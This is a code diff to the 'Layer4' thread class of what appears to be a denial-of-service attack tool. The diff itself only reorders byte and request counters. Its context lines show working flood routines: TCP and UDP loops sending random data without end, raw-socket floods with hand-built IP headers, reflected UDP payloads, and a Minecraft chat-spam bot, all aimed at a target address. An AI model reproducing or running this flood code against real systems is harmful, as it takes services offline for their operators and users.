@@ -54,8 +54,8 @@ class Layer4(Thread):
         if proxies:
             self._proxies = list(proxies)
 
-        self._requests_sent = requests_sent_counter
         self._bytes_sent = bytes_sent_counter
+        self._requests_sent = requests_sent_counter
         self._last_request_timestamp = last_request_timestamp
 
     def run(self) -> None:
@@ -125,9 +125,9 @@ class Layer4(Thread):
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
+                    self._bytes_sent += 1024
                     self._requests_sent += 1
                     self._last_request_timestamp.set(time.time())
-                    self._bytes_sent += 1024
         except Exception:
             s.close()
 
@@ -144,9 +144,9 @@ class Layer4(Thread):
 
                 while s.send(b'\x01'):
                     s.send(b'\x00')
+                    self._bytes_sent += 2
                     self._requests_sent += 2
                     self._last_request_timestamp.set(time.time())
-                    self._bytes_sent += 2
 
         except Exception:
             s.close()
@@ -156,9 +156,9 @@ class Layer4(Thread):
         try:
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(randbytes(1024), self._target):
+                    self._bytes_sent += 1024
                     self._requests_sent += 1
                     self._last_request_timestamp.set(time.time())
-                    self._bytes_sent += 1024
 
         except Exception:
             s.close()
@@ -170,9 +170,9 @@ class Layer4(Thread):
             with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(payload, self._target):
+                    self._bytes_sent += len(payload)
                     self._requests_sent += 1
                     self._last_request_timestamp.set(time.time())
-                    self._bytes_sent += len(payload)
 
         except Exception:
             s.close()
@@ -184,9 +184,9 @@ class Layer4(Thread):
             with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
+                    self._bytes_sent += len(payload[0])
                     self._requests_sent += 1
                     self._last_request_timestamp.set(time.time())
-                    self._bytes_sent += len(payload[0])
 
         except Exception:
             s.close()
@@ -220,9 +220,9 @@ class Layer4(Thread):
                     while c:
                         chat = Minecraft.chat(PyRoxyTools.Random.rand_str(255))
                         s.send(chat)
+                        self._bytes_sent += len(chat)
                         self._requests_sent += 1
                         self._last_request_timestamp.set(time.time())
-                        self._bytes_sent += len(chat)
                         sleep(1.2)
                         c -= 1
 
@@ -237,9 +237,9 @@ class Layer4(Thread):
         try:
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(payload, self._target):
+                    self._bytes_sent += len(payload)
                     self._requests_sent += 1
                     self._last_request_timestamp.set(time.time())
-                    self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
